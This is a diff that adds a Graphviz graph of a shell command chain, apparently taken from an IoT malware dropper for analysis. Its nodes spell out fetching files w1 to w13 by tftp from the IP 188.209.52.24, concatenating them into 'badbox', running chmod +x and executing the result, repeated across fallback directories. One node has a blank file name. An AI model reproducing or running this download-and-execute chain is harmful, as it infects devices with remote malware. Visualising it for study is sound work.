@@ -1,0 +1,264 @@
+digraph {
+0 [label="ulimit -n 1024 "];
+0 -> 0
+2 [label="cp /bin/busybox /tmp/ "];
+2 -> 2
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 14 [label="||,"];
+14 [label="tftp -r w1 -g 188.209.52.24 "];
+14 -> 16 [label=";,"];
+16 [label="cat w1 badbox "];
+16 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 34 [label="||,"];
+34 [label="tftp -r w2 -g 188.209.52.24 "];
+34 -> 36 [label=";,"];
+36 [label="cat w2 badbox "];
+36 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 54 [label="||,"];
+54 [label="tftp -r w3 -g 188.209.52.24 "];
+54 -> 56 [label=";,"];
+56 [label="cat w3 badbox "];
+56 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 74 [label="||,"];
+74 [label="tftp -r w4 -g 188.209.52.24 "];
+74 -> 76 [label=";,"];
+76 [label="cat w4 badbox "];
+76 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 94 [label="||,"];
+94 [label="tftp -r w5 -g 188.209.52.24 "];
+94 -> 96 [label=";,"];
+96 [label="cat w5 badbox "];
+96 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 114 [label="||,"];
+114 [label="tftp -r w6 -g 188.209.52.24 "];
+114 -> 116 [label=";,"];
+116 [label="cat w6 badbox "];
+116 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 134 [label="||,"];
+134 [label="tftp -r w7 -g 188.209.52.24 "];
+134 -> 136 [label=";,"];
+136 [label="cat w7 badbox "];
+136 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 154 [label="||,"];
+154 [label="tftp -r w8 -g 188.209.52.24 "];
+154 -> 156 [label=";,"];
+156 [label="cat w8 badbox "];
+156 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 174 [label="||,"];
+174 [label="tftp -r w9 -g 188.209.52.24 "];
+174 -> 176 [label=";,"];
+176 [label="cat w9 badbox "];
+176 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 194 [label="||,"];
+194 [label="tftp -r w10 -g 188.209.52.24 "];
+194 -> 196 [label=";,"];
+196 [label="cat w10 badbox "];
+196 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 214 [label="||,"];
+214 [label="tftp -r   -g 188.209.52.24 "];
+214 -> 216 [label=";,"];
+216 [label="cat   badbox "];
+216 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 234 [label="||,"];
+234 [label="tftp -r w12 -g 188.209.52.24 "];
+234 -> 236 [label=";,"];
+236 [label="cat w12 badbox "];
+236 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+261 [label="./badbox "];
+261 -> 244 [label=";,"];
+244 [label="cd /tmp "];
+244 -> 244
+246 [label="cd /var/run "];
+246 -> 248 [label="||,"];
+248 [label="cd /mnt "];
+248 -> 250 [label="||,"];
+250 [label="cd /root "];
+250 -> 252 [label="||,"];
+252 [label="cd / "];
+252 -> 254 [label="||,"];
+254 [label="tftp -r w13 -g 188.209.52.24 "];
+254 -> 256 [label=";,"];
+256 [label="cat w13 badbox "];
+256 -> 258 [label=";,"];
+258 [label="badbox "];
+258 -> 258
+260 [label="chmod +x * "];
+260 -> 261 [label=";,"];
+}
